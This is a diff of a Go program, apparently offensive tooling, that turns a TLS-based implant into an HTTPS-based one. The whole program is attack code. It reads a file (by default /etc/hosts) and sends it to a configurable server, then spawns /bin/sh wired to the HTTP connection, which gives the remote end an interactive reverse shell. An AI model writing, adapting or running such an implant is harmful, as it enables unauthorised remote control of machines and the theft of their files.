@@ -1,0 +1,70 @@
+--- ../comms_over_tls/comms_over_tls.go	Sat Sep  7 18:45:54 2024
++++ comms_over_https.go	Sat Sep  7 18:45:54 2024
+@@ -1,9 +1,9 @@
+-// Program comms_over_tls - argv_from_file_descriptor but uses TLS
++// Program comms_over_https - coms_over_tls but uses HTTPS
+ package main
+ 
+ /*
+- * comms_over_tls.go
+- * argv_from_file_descriptor, but with TLS comms
++ * comms_over_https.go
++ * Like comms_over_tls but with HTTPS
+  * By J. Stuart McMurray
+  * Created 20240905
+  * Last Modified 20240906
+@@ -11,11 +11,11 @@
+ 
+ import (
+ 	"cmp"
+-	"crypto/tls"
+ 	"errors"
+ 	"fmt"
+ 	"io"
+ 	"log"
++	"net/http"
+ 	"os"
+ 	"os/exec"
+ 	"syscall"
+@@ -23,7 +23,7 @@
+ 
+ // Compile-time configurables
+ var (
+-	Address       = "localhost:4444"
++	Address       = "https://localhost:4444/shell"
+ 	AddressEnvVar = "ALPT4ATS_ADDRESS"
+ 	File          = "/etc/hosts"
+ 	FileEnvVar    = "ALPT4ATS_FILE"
+@@ -48,9 +48,10 @@
+ 	}
+ 
+ 	/* Connect to the server. */
+-	c, err := tls.Dial("tcp", Address, nil)
++	pr, pw := io.Pipe()
++	res, err := http.Post(Address, "", pr)
+ 	if nil != err {
+-		log.Fatalf("Error connecting to server: %s", err)
++		log.Fatalf("HTTPS request error: %s", err)
+ 	}
+ 
+ 	/* Send back the file. */
+@@ -58,15 +59,15 @@
+ 	if nil != err {
+ 		log.Fatalf("Error reading file: %s", err)
+ 	}
+-	if _, err := c.Write(b); nil != err {
++	if _, err := pw.Write(b); nil != err {
+ 		log.Printf("Error sending file: %s", err)
+ 	}
+ 
+ 	/* Spawn a shell. */
+ 	sh := exec.Command("/bin/sh")
+-	sh.Stdin = c
+-	sh.Stdout = c
+-	sh.Stderr = c
++	sh.Stdin = res.Body
++	sh.Stdout = pw
++	sh.Stderr = pw
+ 	if err := sh.Run(); nil != err {
+ 		log.Fatalf("Shell died: %s", err)
+ 	}
